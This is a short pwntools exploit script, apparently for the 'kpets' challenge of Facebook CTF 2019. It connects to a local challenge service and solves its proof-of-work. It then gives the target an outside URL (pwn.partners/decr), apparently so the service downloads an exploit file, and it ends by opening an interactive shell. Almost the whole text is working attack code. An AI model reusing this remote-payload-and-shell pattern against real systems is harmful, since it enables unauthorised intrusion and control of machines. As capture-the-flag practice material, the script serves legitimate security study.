from pwn import *
import os
from subprocess import check_output

t = remote('127.0.0.1', 1337)

t.recvuntil('== ')
challenge = t.recvline().strip()
log.info('Challenge: {}'.format(challenge))
pow = process(['/home/fuzz/fbctf-2019/pwnables/kpets/pow.py', 'solve', challenge])
pow.recvuntil('Solution:')
soln = pow.recvline().strip()
pow.close()
#soln = 'A'
log.info('PoW solution: {}'.format(soln))
t.sendlineafter('Input:', soln)

# Upload file
url = 'http://pwn.partners/decr'
t.sendlineafter('(Y/n)', 'y')
t.sendlineafter('URL', url)
log.info('Spawning shell')
t.interactive()
